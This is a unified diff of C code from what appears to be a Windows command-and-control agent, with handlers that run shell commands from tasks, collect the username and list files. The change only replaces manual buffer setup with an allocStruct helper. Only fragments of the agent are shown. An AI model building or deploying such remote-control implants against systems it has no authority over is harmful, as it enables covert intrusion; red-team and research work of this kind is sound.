@@ -36,11 +36,7 @@ void execute_cmd(int taskActionId, int taskId, int argc, struct TLVBuild * tlv) 
 
 void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   if (argc < 1) return;
-  struct TLVBuild out;
-  out.buf = malloc(50);
-  out.read_cursor = 0;
-  out.allocsize = 50;
-  out.bufsize = 0;
+  struct TLVBuild out = allocStruct(50);
 
   int cmdSize = extractInt32(tlv);
   char * cmd = malloc(cmdSize + 1);
@@ -124,11 +120,7 @@ void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
 void identify_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   printf("[+] agent is identifying..\n");
   
-  struct TLVBuild identifyMessage;
-  identifyMessage.buf = malloc(50);
-  identifyMessage.allocsize = 50;
-  identifyMessage.bufsize = 0;
-  identifyMessage.read_cursor = 0;
+  struct TLVBuild identifyMessage = allocStruct(50);
 
   char * username = malloc(UNLEN + 1);
   DWORD usernameLen = UNLEN + 1;
@@ -172,24 +164,14 @@ void identify_cmd(int taskId, int argc, struct TLVBuild * tlv) {
 void fs_dir_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   printf("[+] listing files\n");
 
-  struct TLVBuild response;
-  struct TLVBuild file_list;
+  struct TLVBuild response = allocStruct(50);
+  struct TLVBuild file_list = allocStruct(50);
   
   WIN32_FIND_DATA fdFile;
   HANDLE hFile;
 
   char * path = ".\\*";
   int files = 0;
-
-  response.read_cursor = 0;
-  response.allocsize = 10;
-  response.bufsize = 0;
-  response.buf = malloc(10);
-  
-  file_list.read_cursor = 0;
-  file_list.allocsize = 10;
-  file_list.bufsize = 0;
-  file_list.buf = malloc(10);
   
   if (hFile = FindFirstFile(path, &fdFile)) {
 
